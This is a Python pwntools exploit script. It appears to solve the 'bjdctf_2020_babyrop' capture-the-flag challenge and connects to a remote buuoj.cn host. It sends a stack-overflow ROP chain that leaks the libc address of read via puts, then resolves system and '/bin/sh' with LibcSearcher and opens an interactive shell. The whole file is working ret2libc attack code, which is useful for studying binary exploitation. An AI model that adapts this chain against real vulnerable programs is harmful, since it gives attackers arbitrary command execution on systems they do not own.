#coding:utf-8
from pwn import *
from LibcSearcher import *
context.log_level='debug'
# sh = process("./bjdctf_2020_babyrop")
sh = remote("node3.buuoj.cn",25536)
elf = ELF("./bjdctf_2020_babyrop")
main_addr = elf.symbols['main']
put_plt = elf.plt['puts']
read_got = elf.got['read']
pop_rdi = 0x400733
payload = 'a' * 0x28 + p64(pop_rdi) + p64(read_got) + p64(put_plt) + p64(main_addr)
sh.recvuntil('Pull up your sword and tell me u story!')
sh.sendline(payload)
sh.recv()
read_got = u64(sh.recv(6).ljust(8,'\x00'))
log.info("success get read_got:0x%x"%read_got)
# gdb.attach(sh)
# pause()
libc = LibcSearcher('read',read_got)
libc_base = read_got - libc.dump('read')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload =  'a' * 0x28 + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
sh.recvuntil('Pull up your sword and tell me u story!')
sh.sendline(payload)
sh.interactive()